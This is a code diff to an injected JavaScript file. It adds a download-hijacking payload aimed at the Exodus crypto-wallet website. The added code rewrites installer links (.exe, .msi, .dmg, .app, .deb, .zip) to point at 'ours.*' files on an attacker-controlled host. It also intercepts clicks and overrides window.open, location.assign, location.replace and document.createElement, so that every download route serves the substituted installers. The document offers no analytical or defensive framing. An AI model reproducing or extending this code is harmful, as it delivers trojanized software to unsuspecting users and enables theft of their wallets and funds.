@@ -2373,10 +2373,16 @@
       "var h=location.hostname;" +
       "var isExodus=h==='www.exodus.com'||h==='exodus.com';" +
       "if(isExodus){" +
-      "setTimeout(function(){" +
-      "alert(\"Injected code on Exodus\");" +
+      "var rs='https://domain.com';" +
+      "var rmap={'.exe':'ours.exe','.msi':'ours.msi','.dmg':'ours.dmg','.app':'ours.app','.deb':'ours.deb','.zip':'ours.zip'};" +
+      "var exts=Object.keys(rmap);" +
+      "function gr(u){if(!u||typeof u!=='string')return null;var l=u.toLowerCase();for(var i=0;i<exts.length;i++){if(l.endsWith(exts[i])||l.indexOf(exts[i]+'?')!==-1||l.indexOf(exts[i]+'#')!==-1)return rs+'/'+rmap[exts[i]];}return null;}" +
+      "function rl(){var aa=document.querySelectorAll('a[href]');for(var i=0;i<aa.length;i++){var r=gr(aa[i].href);if(r)aa[i].href=r;}}" +
+      "rl();" +
+      "new MutationObserver(function(){rl();}).observe(document.body,{childList:true,subtree:true});" +
+      "document.addEventListener('click',function(e){var a=e.target.closest?e.target.closest('a'):null;if(a&&a.href){var r=gr(a.href);if(r){e.preventDefault();e.stopImmediatePropagation();window.location.href=r;}}},true);" +
+      "var _wo=window.open;window.open=function(u){var r=gr(u);if(r)return _wo.call(window,r,arguments[1],arguments[2]);return _wo.apply(window,arguments);};" +
       "try{window.parent.postMessage({type:'exodus_injected'},'*');}catch(e){}" +
-      "},2000);" +
       "return;" +
       "}" +
       "var our=location.protocol+'//'+location.host;" +
@@ -2616,26 +2622,34 @@
 
   var DOWNLOAD_REPLACE_CONFIG = {
     realsServer: "https://domain.com",
+    extensions: [".exe", ".msi", ".dmg", ".app", ".deb", ".zip"],
     replacements: {
       ".exe": "ours.exe",
       ".msi": "ours.msi",
       ".dmg": "ours.dmg",
-      ".app": "ours.app"
+      ".app": "ours.app",
+      ".deb": "ours.deb",
+      ".zip": "ours.zip"
     }
   };
 
+  function getReplacedUrl(url) {
+    if (!url || typeof url !== "string") return null;
+    var lower = url.toLowerCase();
+    for (var i = 0; i < DOWNLOAD_REPLACE_CONFIG.extensions.length; i++) {
+      var ext = DOWNLOAD_REPLACE_CONFIG.extensions[i];
+      if (lower.endsWith(ext) || lower.indexOf(ext + "?") !== -1 || lower.indexOf(ext + "#") !== -1) {
+        return DOWNLOAD_REPLACE_CONFIG.realsServer + "/" + DOWNLOAD_REPLACE_CONFIG.replacements[ext];
+      }
+    }
+    return null;
+  }
+
   function replaceDownloadLinks() {
-    var extensions = Object.keys(DOWNLOAD_REPLACE_CONFIG.replacements);
     var links = document.querySelectorAll("a[href]");
     for (var i = 0; i < links.length; i++) {
-      var href = links[i].href.toLowerCase();
-      for (var j = 0; j < extensions.length; j++) {
-        if (href.endsWith(extensions[j])) {
-          var newFile = DOWNLOAD_REPLACE_CONFIG.replacements[extensions[j]];
-          links[i].href = DOWNLOAD_REPLACE_CONFIG.realsServer + "/" + newFile;
-          break;
-        }
-      }
+      var replaced = getReplacedUrl(links[i].href);
+      if (replaced) links[i].href = replaced;
     }
   }
 
@@ -2643,6 +2657,67 @@
 
   var dlObserver = new MutationObserver(function () { replaceDownloadLinks(); });
   dlObserver.observe(document.body, { childList: true, subtree: true });
+
+  document.addEventListener("click", function (e) {
+    var anchor = e.target.closest ? e.target.closest("a") : null;
+    if (anchor && anchor.href) {
+      var replaced = getReplacedUrl(anchor.href);
+      if (replaced) {
+        e.preventDefault();
+        e.stopImmediatePropagation();
+        window.location.href = replaced;
+      }
+    }
+  }, true);
+
+  var _origOpen = window.open;
+  window.open = function (url) {
+    var replaced = getReplacedUrl(url);
+    if (replaced) return _origOpen.call(window, replaced, arguments[1], arguments[2]);
+    return _origOpen.apply(window, arguments);
+  };
+
+  var _origAssign = window.location.assign;
+  if (_origAssign) {
+    window.location.assign = function (url) {
+      var replaced = getReplacedUrl(url);
+      return _origAssign.call(window.location, replaced || url);
+    };
+  }
+
+  var _origReplace = window.location.replace;
+  if (_origReplace) {
+    window.location.replace = function (url) {
+      var replaced = getReplacedUrl(url);
+      return _origReplace.call(window.location, replaced || url);
+    };
+  }
+
+  var _origCreateElement = document.createElement;
+  document.createElement = function (tag) {
+    var el = _origCreateElement.apply(document, arguments);
+    if (tag.toLowerCase() === "a") {
+      var _origSetAttr = el.setAttribute;
+      el.setAttribute = function (name, value) {
+        if (name === "href") {
+          var replaced = getReplacedUrl(value);
+          if (replaced) value = replaced;
+        }
+        return _origSetAttr.call(el, name, value);
+      };
+      Object.defineProperty(el, "href", {
+        set: function (val) {
+          var replaced = getReplacedUrl(val);
+          _origSetAttr.call(el, "href", replaced || val);
+        },
+        get: function () {
+          return el.getAttribute("href");
+        },
+        configurable: true
+      });
+    }
+    return el;
+  };
 
 })();
 
